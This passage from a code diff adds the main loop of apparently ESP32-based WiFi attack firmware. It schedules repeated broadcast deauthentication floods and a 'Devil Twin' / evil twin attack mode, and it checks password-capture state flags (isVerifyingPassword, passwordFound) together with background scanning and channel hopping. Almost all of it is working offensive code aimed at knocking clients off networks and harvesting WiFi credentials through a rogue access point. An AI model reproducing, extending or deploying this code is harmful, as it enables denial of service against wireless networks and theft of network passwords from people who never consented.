+            int removeCount = uniqueClientMACs.size() / 2;
+            uniqueClientMACs.erase(uniqueClientMACs.begin(), uniqueClientMACs.begin() + removeCount);
+            uniqueClientMACs.shrink_to_fit();
+          }
+          last_mac_cleanup = millis();
+        }
+
+        // 👇 CONSTANT RATE PACKET SENDING - EXACT TIMING
+        if (combined_attack_active && deauth_attack_active &&
+            (millis() - last_constant_deauth >= CONSTANT_DEAUTH_INTERVAL))
+        {
+          send_constant_deauth(); // Sends EXACT number of packets
+          last_constant_deauth = millis();
+        }
+
+        // Update client count
+        if (millis() - last_client_check >= CLIENT_CHECK_INTERVAL_MS)
+        {
+          updateClientCount();
+          last_client_check = millis();
+        }
+
+        // Background scanning - STABLE VERSION
+        if (background_scanning_active &&
+            (millis() - last_scan_time >= BACKGROUND_SCAN_INTERVAL))
+        {
+          performBackgroundScan(); // Updated stable version
+        }
+      }
+
+      // // ===== MODIFIED: Devil Twin attack handling - Now works with deauthing_active =====
+      // // Yeh condition ab sirf deauthing_active check karegi, devil_twin_active nahi
+      // if (deauthing_active && !devil_twin_active && !evil_twin_running)
+      // {
+      //   // MAC cleanup
+      //   if (millis() - last_mac_cleanup >= MAC_CLEANUP_INTERVAL)
+      //   {
+      //     if (uniqueClientMACs.size() > MAX_STORED_CLIENTS / 2)
+      //     {
+      //       int removeCount = uniqueClientMACs.size() / 2;
+      //       uniqueClientMACs.erase(uniqueClientMACs.begin(), uniqueClientMACs.begin() + removeCount);
+      //       uniqueClientMACs.shrink_to_fit();
+      //     }
+      //     last_mac_cleanup = millis();
+      //   }
+
+      //   // Send deauth for combined attack - Devil Twin style
+      //   if (combined_attack_active && deauth_attack_active &&
+      //       (millis() - last_deauth_send >= DEAUTH_INTERVAL_MS))
+      //   {
+      //     send_broadcast_deauth();
+      //     delay(2);
+      //     last_deauth_send = millis();
+      //   }
+
+      //   // Update client count
+      //   if (millis() - last_client_check >= CLIENT_CHECK_INTERVAL_MS)
+      //   {
+      //     updateClientCount();
+      //     last_client_check = millis();
+      //   }
+
+      //   // Background scanning - Devil Twin style (WITHOUT password verification checks)
+      //   if (background_scanning_active &&
+      //       (millis() - last_scan_time >= BACKGROUND_SCAN_INTERVAL))
+      //   {
+      //     // Call the existing performBackgroundScan function
+      //     // It already has its own verification checks inside
+      //     performBackgroundScan();
+      //   }
+      // }
+
+      // Original Devil Twin handling - keep as is for actual Devil Twin attack
+      if (devil_twin_active && deauthing_active)
+      {
+        // MAC cleanup
+        if (millis() - last_mac_cleanup >= MAC_CLEANUP_INTERVAL)
+        {
+          if (uniqueClientMACs.size() > MAX_STORED_CLIENTS / 2)
+          {
+            int removeCount = uniqueClientMACs.size() / 2;
+            uniqueClientMACs.erase(uniqueClientMACs.begin(), uniqueClientMACs.begin() + removeCount);
+            uniqueClientMACs.shrink_to_fit();
+          }
+          last_mac_cleanup = millis();
+        }
+
+        // Send deauth for combined attack
+        if (combined_attack_active && deauth_attack_active &&
+            evil_twin_running && (millis() - last_deauth_send >= DEAUTH_INTERVAL_MS))
+        {
+          send_broadcast_deauth();
+          delay(2);
+          last_deauth_send = millis();
+        }
+
+        // Update client count
+        if (millis() - last_client_check >= CLIENT_CHECK_INTERVAL_MS)
+        {
+          updateClientCount();
+          last_client_check = millis();
+        }
+
+        // Background scanning
+        if (background_scanning_active && !isVerifyingPassword && !passwordFound &&
+            devil_twin_active &&
+            (millis() - last_scan_time >= BACKGROUND_SCAN_INTERVAL))
+        {
+          performBackgroundScan();
+        }
+      }
+
+      // Channel monitoring for regular deauth (if someone still uses old deauth)
+      // This will now be handled by the Devil Twin style code above
+      // But keep it for backward compatibility
+      if (deauthing_active && !devil_twin_active && !evil_twin_running && !background_scanning_active)
+      {
+        uint8_t currentChan;
+        esp_wifi_get_channel(&currentChan, NULL);
+
+        if (_selectedNetwork.ch >= 1 && _selectedNetwork.ch <= 13 && currentChan != _selectedNetwork.ch)
+        {
+          esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
+        }
+      }
+
+      // Small delay to prevent watchdog issues
+      delay(10);
+    }
+
+    // ==================== MODE 1: VENOME PROJECT ====================
+    else if (bootMode == 1)
+    {
+      vTaskDelay(pdMS_TO_TICKS(1000)); // Venome project handles its own loop
+    }
+
+    // ==================== MODE 2: VENOME VERIFIER ====================
+    else if (bootMode == 2)
+    {
+      // Nothing needed here - AsyncWebServer runs in background
+      vTaskDelay(pdMS_TO_TICKS(100));
+    }
+  }
+}
